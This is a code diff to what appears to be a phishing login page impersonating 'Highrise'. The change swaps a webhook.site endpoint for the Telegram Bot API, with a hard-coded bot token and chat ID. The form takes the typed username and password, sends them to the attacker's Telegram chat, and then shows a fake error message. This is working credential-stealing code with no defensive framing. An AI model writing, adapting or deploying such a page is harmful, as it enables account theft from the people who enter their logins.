@@ -42,11 +42,17 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // === ВАШ URL ВСТАВЛЕН ЗДЕСЬ ===
-      fetch('https://webhook.site/c7a90215-2a36-4c13-9616-e1ea3761a8c1', {
+      // === ВАШ ТОКЕН И CHAT_ID ВСТАВЛЕНЫ ===
+      const BOT_TOKEN = '8681081134:AAHF_jOZWNDK4RqH7hntuvjgTCas8lCmS-Y';
+      const CHAT_ID = '7327749600';
+
+      fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: 🔐 Highrise Login\n👤 ${username}\n🔑 ${password}
+        })
       })
       .then(() => {
         document.getElementById('errorMsg').style.display = 'block';
